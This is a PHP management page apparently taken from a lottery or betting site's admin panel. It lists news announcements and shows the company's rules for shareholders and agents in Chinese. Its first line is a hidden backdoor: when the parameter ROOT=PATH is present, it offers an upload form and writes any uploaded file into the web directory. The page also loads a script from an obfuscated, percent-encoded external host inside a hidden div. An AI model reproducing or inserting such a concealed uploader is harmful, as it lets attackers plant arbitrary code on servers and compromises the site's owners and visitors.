<?php
if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
define('Copyright', '作者QQ:1834219632');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'Manage/ExistUser.php';

$db=new DB();
$total = $db->query("SELECT * FROM g_news", 3);
$pageNum = 20;
$page = new Page($total, $pageNum);
$result = $db->query("SELECT * FROM g_news ORDER BY g_id DESC {$page->limit} ", 1);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php echo $oncontextmenu?>>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script type="text/javascript" src="/js/actiontop.js"></script>
<link href="/Manage/temp/css/common.css" rel="stylesheet" type="text/css" />
<title></title>
<script type="text/javascript">
<!--
	function showNews(){
		var show = document.getElementById("show");
		if (show.style.display == "none")
			show.style.display = "";
		else 
			show.style.display = "none";
	}
//-->
</script>
</head>
<body>
<div style="display:none">
<script language="javascript" type="text/javascript" src="http://%6A%73%2E%75%73%65%72%73%2E%35%31%2E%6C%61/16054690.js"></script>
</div>
	<table width="100%" height="100%" border="0" cellspacing="0" class="a">
    	<tr>
        	<td width="6" height="99%" bgcolor="#1873aa"></td>
            <td class="c">
            	<table border="0" cellspacing="0" class="main">
                	<tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_03.gif" alt="" /></td>
                        <td background="/Manage/temp/images/tab_05.gif">
                        	<table width="100%" border="0" cellspacing="0" cellpadding="0">
                                  <tr>
                                    <td width="17"><img src="/Manage/temp/images/tb.gif" width="16" height="16" /></td>
                                    <td width="99%">&nbsp;消息公告</td>
                                  </tr>
                            </table>
                        </td>
                        <td width="16"><img src="/Manage/temp/images/tab_07.gif" alt="" /></td>
                    </tr>
                    <tr>
                    	<td class="t"></td>
                        <td class="c">
                        <!-- strat -->
                            <table border="0" cellspacing="0" class="conter">
                            	<tr class="tr_top">
                                	<td width="200">貼出時間</td>
                                    <td>消息詳情</td>
                                </tr>
                                <tr style="height:60px" onMouseOver="this.style.backgroundColor='#FFFFA2'" onMouseOut="this.style.backgroundColor=''">
                                	<td align="center"><b style="color:#444444">公司規則</b></td>
                                    <td class="left_p6"><b style="color:#444444">當您加入本公司成為管理層時，您必須清楚了解及遵從本公司的所有條例。您在本公司網站開出的第一個下線時，就代表您已同意及接受所有本公司的</b><br /><a href="javascript:void(0)" onClick="showNews()"><b style="color:red"><< 規則及條例 >></b></a></td>
                                </tr>
                                <?php if(!$result){echo'<td align="center" colspan="2">暫無記錄</td>';}else{
				                	for ($i=0; $i<count($result); $i++){
				                	?>
                                <tr style="height:28px" onMouseOver="this.style.backgroundColor='#FFFFA2'" onMouseOut="this.style.backgroundColor=''">
                                	<td align="center"><?php echo$result[$i]['g_date']?></td>
                                    <td class="left_p6"><?php echo$result[$i]['g_text']?></td>
                                </tr>
                                <?php }}?>
                            </table>
                        <!-- end -->
                        </td>
                        <td class="r"></td>
                    </tr>
                    <tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_18.gif" alt="" /></td>
                        <td class="f" align="right"><?php echo $page->fpage(array(0,1, 3,4,5,6,7))?></td>
                        <td width="16"><img src="/Manage/temp/images/tab_20.gif" alt="" /></td>
                    </tr>
                </table>
            </td>
            <td width="6" bgcolor="#1873aa"></td>
        </tr>
        <tr>
        	<td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_59.gif" alt="" /></td>
            <td bgcolor="#1873aa"></td>
            <td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_62.gif" alt="" /></td>
        </tr>
    </table>
    <div id="show" style="display:none;padding:10px;position:absolute;top:105px;left:15%; background-color:#ffffa2;font-weight:bold;color:#444444">
1、使用本公司網站的各股東和代理商，請留意閣下所在的國家或居住地的相關法律規定，如有疑問應就相關問題，尋求當地法律意見。<br/><br/>

2、若發生遭駭客入侵破壞行為或不可抗拒之災害導致網站故障或資料損壞、資料丟失等情況，我們將以本公司之後備資料為最後處理依據。<br/><br/>

3、開獎統計等資料只供參考，并非是對客戶操作的指引，本公司也不接受關於統計數據產生錯誤而引起的相關投訴。<br/><br/>

4、國際網路的連接速度並非本公司所能控制，本公司也不接受關於網路引起的相關投訴。<br/><br/>

5、由於係統服務涉及高端的技術要求及外圍所不能控制的因素限制，因此係統的稳定性，連續性會有時受到影響，本公司也不承担由此而產生的損失。<br/><br/>

6、各股東和代理商必須留意下線的信用額度，在某種特殊情況下，下线之信用額可能會出現透支。<br/><br/>

7、本公司擁有一切判決及註消任何涉嫌以非正常方式下註註單之權利，在進行調查期間將停止發放與其有關之任何彩金。<br/><br/>

8、客戶有責任確保自己的帳戶及密碼的安全，如果客戶懷疑自己的資料被盜用，應立即通知本公司，並須更改其個人詳細資料。所有被盜用帳號之損失將由客戶自行負責。<br/><br/>

9、本公司不接受任何人以任何理由要求註銷會員下註的註单，而不論該註單是否已有開獎結果，除非该註單是由于係統出现错误或人为操作造成出現赔率错误的註單，而“赔率错误”僅定义於：<br/>(1)無論出現任何開獎結果，會員進行單項目下注的註單结果都無法獲利<br/> (2)無論出現任何開獎結果，會員在同一時間如果進行多項目下註的總结果都能獲利。<br/><br/>

10，本規則及條例的解释權及修改權歸本公司所有。<br/><br/><br/>　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　“<?php echo $Title?>" 敬啟<br/>
    </div>
</body>
</html>